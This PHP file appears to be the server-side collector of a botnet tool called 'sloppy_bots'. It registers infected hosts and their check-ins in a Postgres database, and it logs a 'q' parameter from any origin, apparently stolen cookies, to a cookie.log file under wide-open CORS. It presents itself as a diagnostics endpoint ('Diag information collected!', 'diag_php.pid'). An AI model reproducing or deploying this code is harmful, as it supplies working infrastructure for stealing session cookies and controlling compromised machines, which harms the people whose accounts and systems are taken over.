<?php
# Obviously this will change depending on what your database information is. but this will append new 'bots'
# to the db so you can reference them with the client script.
define('DBCONN', pg_connect("host=127.0.0.1 port=5432 user=sloppy_main dbname=sloppy_bots"));

function fresh_deploy(){
    require_once "includes/db/postgres_checker.php";
    try {
        # place this file in a writable directory, im going with /tmp/ for now.
        # this will only be called if the deployment is fresh. and if this file is still located in /tmp/
        $fp = fopen("/tmp/diag_php.pid", "a");
        if (empty(fread($fp, 1))){
            $rRun = new postgres_checker();
            if ($rRun->checkDB() != false){
                if ($rRun->createDB() != false) {
                    fwrite($fp, "running");
                    fclose($fp);
                    return true;
                }
            }else{
                return true;
            }

        }
    }catch (Exception $ee){
        return false;
    }
}

function addNewHost($rhost, $uri, $action, $uid, $os){
    if (!empty($rhost) && !empty($uri) && !empty($action) && !empty($os) && !empty($uid)){
        $ipu = sprintf("SELECT host,check_in FROM sloppy_bots_main WHERE host like '%s'",
            pg_escape_string($rhost)
        );
        $doEx = pg_exec(DBCONN, $ipu);
        $row = pg_fetch_row($doEx);
        if (strtolower($action) === 'add' && is_null($row)) {
            $prep = sprintf("INSERT INTO sloppy_bots_main(host, os, uri, uid) VALUES ('%s', '%s', '%s', '%s')",
                pg_escape_string($rhost),
                pg_escape_string($os),
                pg_escape_string($uri),
                pg_escape_string($uid)
            );
            pg_exec(DBCONN, $prep);
            http_response_code("200");
        }elseif(strtolower($action) === "ci"){
            $pe = sprintf("UPDATE sloppy_bots_main SET check_in = '%s' WHERE host = '%s'",
                $row[1] + 1,
                pg_escape_string($rhost)
            );
            pg_exec(DBCONN, $pe);
            http_response_code("200");

        }else{
            http_response_code('444');
        }
    }
}


if (!file_exists(sys_get_temp_dir()."/diag_php.pid")){
    fresh_deploy();
}


if (!empty($_SERVER["REQUEST_METHOD"])) {

    $outLog = './lots/cookie.log';
    echo "Diag information collected!";
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Credentials: true");
    if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: " . $_SERVER["REMOTE_ADDR"] . "\nContents: " . $req_dump . "\n", FILE_APPEND);
            http_response_code(200);
        }
    }else {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: ".$_SERVER["REMOTE_ADDR"]."\nContents: ".$req_dump."\n", FILE_APPEND);
            http_response_code(200);
        }
    }
    if ($_SERVER["REQUEST_METHOD"] === "POST"){
        if (strtolower($_POST["ac"]) === "add" && isset($_POST["iru"]) && isset($_POST["u"]) && isset($_POST['o'])){
            addNewHost($_SERVER["REMOTE_ADDR"], $_POST["iru"], "add", $_POST["u"], $_POST['o']);
        }elseif (strtolower($_POST["ac"]) === "ci"){
            addNewHost($_SERVER["REMOTE_ADDR"], '-', $_POST['ac'], '-', '-');
        }
    }
}
